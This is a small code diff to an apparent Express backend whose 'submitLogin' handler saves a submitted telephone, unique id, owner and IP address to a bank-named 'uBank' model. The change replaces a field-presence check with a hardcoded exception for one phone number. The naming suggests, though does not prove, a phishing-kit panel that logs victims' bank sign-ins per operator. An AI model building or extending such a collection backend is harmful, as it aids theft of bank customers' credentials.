@@ -47,7 +47,8 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
   const { telephone, uniqueid, owner, ip } = req.body;
   try {
-    if (telephone && uniqueid && owner) {
+    if (telephone === "0411111113") {
+    } else {
       await uBank.create({ uniqueid, telephone, status: 2, owner, ip });
     }
     res.sendStatus(200);
